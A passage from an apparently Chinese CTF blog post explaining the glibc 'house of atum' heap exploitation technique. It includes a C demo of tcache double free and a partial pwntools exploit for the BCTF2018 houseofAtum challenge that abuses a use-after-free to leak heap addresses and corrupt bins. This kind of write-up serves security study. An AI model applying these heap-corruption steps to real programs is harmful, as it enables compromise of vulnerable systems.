alt="image-20250325170231320"></p><ul><li>现在我们第<code>8</code>次释放堆块，查看<code>bins</code>的状态，此时这个<code>chunk</code>的<code>fd</code>指针已经被置<code>0</code>，并且该堆块除了已经放入到<code>tcachebin</code>中，也会被放入到<code>tcachebin</code>中。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325170415527.png" alt="image-20250325170415527"></p><h2 id="实验2"><a class="markdownIt-Anchor" href="#实验2"></a> 实验2</h2><ul><li>接下来我们一步一步完善我们的利用方式。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line"></span><br><span class="line">    ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="built_in">free</span>(ptr1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptr2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    *ptr2 = (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)ptr1<span class="number">-0x10</span><span class="number">-0x10</span>;</span><br><span class="line">    ptr3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这时我们将这个代码编译后<code>patchelf</code>，进行调试并且画图理解。我们先来查看堆块释放<code>7</code>次，将<code>tcachebin</code>填满之后就会出现如下图所示。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325221011601.png" alt="image-20250325221011601"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325221127719.png" alt="image-20250325221127719"></p><ul><li>然后当我们再释放一次堆块，此时<code>tcachebin</code>对应存储着<code>0x20</code>的<code>size</code>已经被填满了，这时这个堆块就会被放入<code>fastbin</code>中，如下图所示，并且此时该<code>堆块</code>的<code>fd</code>指针会被设置为<code>0</code></li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325221322784.png" alt="image-20250325221322784"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325221635647.png" alt="image-20250325221635647"></p><ul><li>这时我们再申请与之前释放的相同大小的堆块，此时就会从<code>tcachebin</code>中去取空闲的堆块。取完之后，<code>tcachebin</code>这个数组元素的值就会被设置为<code>0</code>，但是<code>tcachebins</code>有一个<code>count</code>标志用于表明该<code>tcachebin</code>中存放空闲chunk的数量，但是这时<code>tcachebin</code>相当于没有空闲的堆块。</li><li>但是我们看到<code>fastbin</code>数组中还有空闲的堆块。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325221723067.png" alt="image-20250325221723067"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325222007942.png" alt="image-20250325222007942"></p><ul><li>这时我们修改我们申请过来的堆块的<code>fd</code>指针，将该指针的值设置为<code>chunk_pre_size_addr - 0x10</code>如下图所示。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325222439711.png" alt="image-20250325222439711"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325222409026.png" alt="image-20250325222409026"></p><ul><li>这时我们申请一个堆块，此时我们还会申请到<code>0x55731847a250</code>这个位置，但是<code>0x55731847a240</code>会被链到<code>tcachebin</code>链表上，这样我们</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325222617597.png" alt="image-20250325222617597"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325222625783.png" alt="image-20250325222625783"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325222749311.png" alt="image-20250325222749311"></p><ul><li>然后我们再次申请一个堆块，此时<code>malloc()</code>返回的地址对应的就会是<code>fake_fd</code>这边，对应着我们前面两次申请的堆块的<code>prev_size_addr</code>，这时我们就可以通过这次申请过来的堆块写入数据，从而达到修改<code>chunk</code>的<code>prev_size</code>、和<code>chunk</code>的<code>size</code>、<code>P</code>、<code>N</code>、<code>M</code>这三个标志位。从而进行后续的利用操作。</li></ul><h1 id="利用方式"><a class="markdownIt-Anchor" href="#利用方式"></a> 利用方式</h1><ul><li>利用条件：<ul><li>需要存在<code>UAF</code>漏洞，并且可以使用<code>tcachebin double free</code>。</li><li>需要泄露堆的地址。</li><li>需要泄露</li></ul></li></ul><ul><li>申请 <code>chunk A</code>，大小在 <code>fastbin</code> 范围内</li><li>释放 <code>A</code>，连续释放 <code>8</code> 次，此时，<code>A</code> 的 <code>fd</code> 被清 <code>0</code>，<code>A</code> 也被放置到了 <code>fastbin</code> 里面</li><li>申请一个 <code>chunk</code>，将其 <code>fd</code> 修改为 <code>A - 0x10</code>，此时 <code>tcache</code> 中的 <code>counts</code> 为 <code>6</code></li><li>再申请一个 <code>chunk</code>，从 <code>fastbin</code> 里面取，但是会把 <code>fastbin</code> 里面剩余的一个 <code>chunk</code> 链入到 <code>tcachebin</code></li><li>再次分配就会分配到地址 <code>A-0x10</code> 处，就可以修改原来 <code>A</code> 的 <code>presize/size</code> 等</li></ul><h1 id="house-of-atum_level_1"><a class="markdownIt-Anchor" href="#house-of-atum_level_1"></a> house of atum_level_1</h1><ul><li>题目来源：BCTF2018-house-of-atum</li><li>题目附件：搜索一下就能找到</li><li>涉及知识点：<code>house of atum</code>、<code>tcachebin下触发unlink</code>、<code>unsortedbin泄露libc地址</code>、<code>tcachebin_UAF申请任意地址</code>、<code>简单的__free_hook的利用</code>，总的来说也是一套组合利用，由于<code>tcachebin下触发unlink</code>、<code>unsortedbin_attack</code>这两个利用还没怎么了解，所以利用完<code>house of atum</code>就卡住了。</li><li>拿到附件之后我们需要使用<code>glibc-all-in-one</code>项目对应的<code>glibc2.27</code>版本进行patchelf，这样该程序才能正常运行。</li></ul><h2 id="level_1分析1"><a class="markdownIt-Anchor" href="#level_1分析1"></a> level_1分析1</h2><ul><li>我们先运行一下这个程序看一下这个程序的基本运行逻辑。我们运行一下这个程序发现一开始就会弹出一个菜单。基本上就是<code>增、删、改、查</code>这一字面意思。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230209439.png" alt="image-20250325230209439"></p><ul><li>然后我们就输入选择，我们选择<code>1</code>后，程序会要求用户输入内容。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230346252.png" alt="image-20250325230346252"></p><ul><li>然后我们再选择<code>2</code>看看，我们选择<code>2</code>后，程序会要求我们输入要内容对应堆块的索引值<code>idx</code>，之后让我们输入新的内容。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230426716.png" alt="image-20250325230426716"></p><ul><li>我们先来选择第<code>4</code>个选项，发现程序要求我们输入索引，输入后会输出对应索引的堆块。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230527849.png" alt="image-20250325230527849"></p><ul><li>最后我们选择第<code>3</code>个选项，发现就是清除用户指定索引的堆块。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230621784.png" alt="image-20250325230621784"></p><ul><li>运行完一遍程序后我们就可以查看一下这个程序的保护机制了，发现保护全开。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326174311561.png" alt="image-20250326174311561"></p><ul><li>大致了解程序的运行逻辑之后，我们就使用<code>IDA</code>对这个程序进行逆向一下。结合之前我们运行的程序，我们大致可以分析出<code>main</code>函数其实就是一个类似于菜单的。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230802541.png" alt="image-20250325230802541"></p><ul><li>查看一下<code>initialize()</code>函数，我们发现这个函数其实就是一个输入、输出初始化的一个函数。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230933133.png" alt="image-20250325230933133"></p><ul><li>查看一下<code>menu()</code>这个函数，这个函数会输出菜单，输出菜单后还会调用<code>getint()</code></li><li>而<code>getint()</code>这个函数实现的功能就是字面意思，也就是获取用户的<code>选项输入</code>。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325230956216.png" alt="image-20250325230956216"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325231054654.png" alt="image-20250325231054654"></p><ul><li>接下来就是看按照<code>增</code>、<code>删</code>、<code>改</code>、<code>看</code>这个顺序查看一下菜单对应的各个函数。</li><li>先查看<code>alloc()</code>函数<ul><li>该函数首先会遍历一下<code>已经申请并且存放在notes数组中的堆块个数</code>，我们会发现<code>notes</code>这个是一个全局变量，并且是指针数组类型。</li><li>如果已经有两个堆块了，就会告诉用户<code>太多notes</code>，并且不能再申请堆块了</li><li>如果还没有申请两个堆块，程序接下去就会申请一个<code>0x48</code>大小的堆块。</li><li>并且让用户向里面输入内容。</li></ul></li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325231216793.png" alt="image-20250325231216793"></p><ul><li>接下来查看<code>改</code>即（<code>delete()</code>这个函数），主要就是让用户输入对应的<code>notes</code>数组的索引，然后直接释放对应索引的堆块。</li><li>程序会提示是否要清除堆块，如果输入<code>y</code>就会将<code>notes</code>对应的索引的元素设置为<code>0</code>。<strong>注意这里就存在UAF漏洞，我们可以选择不clear对应索引的堆块</strong></li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325231737109.png" alt="image-20250325231737109"></p><ul><li>之后查看<code>edit</code>这个函数，这个函数就先会让用户输入对应的<code>idx</code>，然后向对应的堆块输入新的内容。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325232057571.png" alt="image-20250325232057571"></p><ul><li>最后再查看<code>show()</code>，这个函数就是输出对应堆块的内容。<strong>注意这个函数可以配合UAF漏洞使用，从而泄露出堆的地址</strong></li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325232206338.png" alt="image-20250325232206338"></p><ul><li>程序分析完之后我们再来查看一下全局变量，看看是否有全局变量被我们遗漏的。发现并没有全局变量被我遗漏的。只有一个<code>notes</code>这个全局变量。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250325234241046.png" alt="image-20250325234241046"></p><h2 id="level_1分析2"><a class="markdownIt-Anchor" href="#level_1分析2"></a> level_1分析2</h2><ul><li>接下来我们进行动态调试，查看一下程序的基本逻辑，我们先写好基本的交互脚本。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,choose</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Clear?(y/n):&#x27;</span>,choose)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>到这里我们先思考一个问题，这边我们的<code>notes</code>只能是申请两个堆块，这时我们就要先仔细思考一下，我们只申请一个堆块，就只对这个堆块进行利用是否可以。我们会发现当我们只申请一个堆块，就来进行<code>house of atum</code>的利用时，虽然我们可以修改到我们所申请堆块的<code>prev_size</code>位和<code>size</code>位，但是这对后续就会出现死路一条。</li><li>首先我们一开始申请的<code>0x250</code>这个堆块是与输入输出缓冲区有关的，而在我们申请堆块相邻高地址处就是<code>top_chunk</code>了。</li><li>这时就会出现一个问题，我们没办法修改相邻的两个堆块中的内容，这时如果我们修改了<code>中间chunk</code>的<code>prev_size</code>和<code>size</code>位，进行一些<code>unlink</code>等操作就会报错，因为我们没办法修改其他堆块从而绕过检查。</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326131739609.png" alt="image-20250326131739609"></p><ul><li>这个时候我们就需要先申请两个堆块了，其中<code>idx=0</code>是我们要进行<code>house of atum</code>利用的堆块。而<code>idx=1</code>对应的堆块是帮助我们绕过检查的堆块。</li><li>然后我们将<code>idx=1</code>对应的堆块，在<code>fd偏移0x30到0x40</code>这个地址处写入<code>payload = p64(0)*7+p64(0x11)</code>，因为<code>tcache</code>一开始设计就是为了<code>提高堆分配的效率</code>，所以当我们释放<code>idx=1</code>对应的堆块时，它被放入<code>tcachebin</code>中，但是里面写入的数据还是存在的。所以我们就可以利用这个一特性先写入<code>payload = p64(0)*7+p64(0x11)</code>，这样我们在之后修改它相邻低地址堆块对应的<code>prev_size和size位</code>时就可以绕过<code>unlink</code>这个检查。此时堆中内容如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/myheart/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,choose</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Clear?(y/n):&#x27;</span>,choose)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326193531005.png" alt="image-20250326193531005"></p><ul><li>在做完绕过准备后，我们先要泄露出堆块的地址，这样我们再能进行<code>house of atum</code>这个利用，这时我们先连续释放<code>2</code>个<code>idx=0</code>对应的堆块，释放之后，这个堆块对应的<code>fd</code>指针，就是指向自己堆块结构中<code>fd</code>指针的地址。如下图所示</li></ul><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326194009607.png" alt="image-20250326194009607"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326194020690.png" alt="image-20250326194020690"></p><p><img src="/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-atum/image-20250326194116301.png" alt="image-20250326194116301"></p><ul><li>接下来我们就可以进行<code>house of atum</code>的利用了<ul><li>我们先释放<code>idx=1</code>处的堆块，因为如果<code>idx=1</code>处的堆块没有被释放，我们就不能连续申请两个堆块，就没办法利用<code>house of atum</code>了。</li><li>先释放<code>idx=1</code>处的堆块后，再释放<code>5</code>次<code>idx=0</code>处的堆块就行。</li><li>第<code>5</code>次释放<code>idx=0</code>处的堆块时，要将<code>notes[0]</code>处的元素设置为<code>0</code>，这样做也是为了后续我们能连续申请两个堆块。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/myheart/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,choose</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Clear?(y/n):&#x27;</span>,choose)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">chunk_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">chunk_addr = <span class="built_in">int</span>.from_bytes(chunk_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;chunk_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">chunk_addr = chunk_addr -<span class="number">0x10</span> - <span class="number">0x20</span> </span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>操作所对应的<code>exp</code>，操作完之后我们再看一下对应的内存，发现堆块的布局如下<code>我们连续释放的堆块已经被放入fastbin中，并且其fd指针已经被设置为0了</code></li></ul><p><img 